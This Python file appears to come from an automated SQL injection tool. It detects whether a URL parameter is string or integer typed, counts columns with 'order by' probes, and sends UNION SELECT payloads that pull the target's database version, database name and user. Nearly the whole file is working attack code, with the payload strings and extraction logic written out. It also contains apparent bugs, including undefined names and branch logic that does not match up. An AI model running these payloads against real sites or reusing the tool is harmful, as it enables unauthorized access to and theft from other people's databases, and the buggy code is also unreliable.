from abc import ABC
from Function_Signatures_of_inputBox import *
from JobFile import *


NOT_FORM_SCAN = 0
list_of_queries = ["version()", "database()", "user()"]


"""
This function puts query with separation and needed data like(version, database, user) 
"""
data = []  # tup[0], tup[1]

def check_if_data(id, response):

    info_of_site = ''
    res = [i for i in range(len(response.text)) if response.text.startswith(str(DATA_NUMBER), i)]
    end = res[1::2]
    start = res[::2]

    if id == 1:
        try:
            for i in range(len(end)):
                info_of_site = response.text[int(start[i])+4:int(end[i])]
                if info_of_site[1:-1] not in list_of_queries:
                    break
        except:
            pass
        data.append(info_of_site)

    elif id == 2:
        for i in range(2):
            try:
                info_of_site = response.text[int(start[i])+4:int(end[i])]
            except:
                pass
            data.append(info_of_site)

    else:
        for i in range(3):
            try:
                info_of_site = response.text[int(start[i])+4:int(end[i])]
            except:
                pass
            data.append(info_of_site)


"""
This function adds separation data to detect suitable response
"""
def final_check(id, url, param_for_payload, first_part_of_url, tup):
    end_of_url = ",3--+-"
    id -= 1

    print(url)

    if id == 1:
        for i in tup:
            query = f"{first_part_of_url}{i}{end_of_url}"
            response = add_param(param_for_payload, query, url)
            check_if_data(id, response)

    elif id == 2:

        query = f"{first_part_of_url}{tup[0]}{end_of_url}"
        response = add_param(param_for_payload, query, url)
        check_if_data(id, response)

    else:
        for i in range(2):
            query = f"{first_part_of_url}{tup[i]}{end_of_url}"
            response = add_param(param_for_payload, query, url)
            check_if_data(id, response)

    if '' not in data:
        return data

    #print("The is no data of the site")
    return SAFE


"""
This function adds an query to a parameter in url
"""
def put_param(id):
    arr_of_additions = []
    add2 = ''
    id -= 1  # because it starts with id

    if id == 1:

        for i in range(3):
            add = f"+concat({DATA_NUMBER},{list_of_queries[i]},{DATA_NUMBER})"
            arr_of_additions.append(add)

    elif id == 2:

        add = f"+concat({DATA_NUMBER},{list_of_queries[0]},{DATA_NUMBER}),concat({DATA_NUMBER},{list_of_queries[1]},{DATA_NUMBER})"
        add2 = f"+NULL,concat({DATA_NUMBER},{list_of_queries[2]},{DATA_NUMBER})"
        arr_of_additions.extend([add, add2])

    elif id == 3:

        add = f"+concat({DATA_NUMBER},{list_of_queries[0]},{DATA_NUMBER}),concat({DATA_NUMBER},{list_of_queries[1]},{DATA_NUMBER}),concat({DATA_NUMBER},{list_of_queries[2]},{DATA_NUMBER})"

    else:

        add = f"+concat({DATA_NUMBER},{list_of_queries[0]},{DATA_NUMBER}),concat({DATA_NUMBER},{list_of_queries[1]},{DATA_NUMBER}),concat({DATA_NUMBER},{list_of_queries[2]},{DATA_NUMBER})" + ",NULL" * (id-3)

    if id == 1 or id == 2:
        return arr_of_additions

    return add


"""
This function do string input into url
"""
def check_for_string(url, param_for_payload):
    #print("STRING: \n")
    query = "1' order by {0} --+-"
    id = 1
    
    resp = add_param(param_for_payload, query.format(id), url)

    while 'unknown column' not in resp.text.lower():
        id += 1
        resp = add_param(param_for_payload, query.format(id), url)

    id -= 1

    tup = put_param(id)
    query = "-1'+and+1=2+UNION+SELECT"

    return final_check(id, url, param_for_payload, query, tup)


"""
This function do int input into url
"""
def check_for_int(url, param_for_payload):
    #print("INT: \n")
    id = 1
    query = "1 order by "
    resp = requests.get(url)

    while 'unknown column' not in resp.text.lower():
        new_query = query + str(id)
        resp = add_param(param_for_payload, new_query, url)
        id += 1
        #print(id)

    id -= 2
    query = "-1+UNION+ALL+SELECT"

    tup = put_param(id)
    return final_check(id, url, param_for_payload, query, tup)


######################       ATTACK ON URL          #######################

"""
This function puts a parameter into url 
"""
def do_job_url(url):

    try:
        param_for_payload = finds_parameter(url)
        
        url = detect_parameter_in_url(url)

        """CHECK IF IT IS A STRING  OR INT """
        string = 0
        query = "' '"
        resp = add_param(param_for_payload, query, url)

        # Check is a string or int
        if "error" not in resp.text.lower():
            string += 1

        if string > 0:
            query = "'"
            resp = add_param(param_for_payload, query, url)

            if "error" in resp.text.lower():
                #print(url, param_for_payload)
                check_type = check_for_string(url, param_for_payload)
            else:
                return None

        elif "error" in resp.text.lower():
            query = "1 AND 1"
            resp = add_param(param_for_payload, query, url)  # check for int

            if "error" not in resp.text:
                #print("yess", url, param_for_payload)
                check_type = check_for_int(url, param_for_payload)

        return check_type
    except:
            pass



######################       INPUT_BOX          #######################

class Sql(Job):

    def __init__(self, website, summary):
        self.website = website
        self.summary = summary


    def do_job(self):
        pass


    """
    This function scans the site and check if there are some inputbox or not
    """
    def scan(self):
        forms = get_all_forms(str(self.website.url))  # forms in html
        if not forms:
            return 0
        for form in forms:
            details = form_details(form)
        return details
